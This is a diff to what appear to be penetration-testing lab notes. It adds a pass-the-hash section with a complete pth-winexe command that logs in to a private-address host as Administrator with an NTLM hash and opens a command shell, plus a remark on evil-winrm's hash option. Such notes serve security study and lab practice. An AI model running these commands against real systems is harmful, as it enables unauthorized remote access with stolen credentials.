@@ -292,7 +292,11 @@ Dual home:
     arp -a
     route print 
 ## Access
- Enabled WinRm as Administrator to use evil-winrm  
+### Pass the Hash with winexe
+
+    pth-winexe //192.168.149.10 -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e cmd   
+### WinRM
+ Enabled WinRm as Administrator to use evil-winrm. -H to pass the hash
  
      WinRM quickconfig       
  
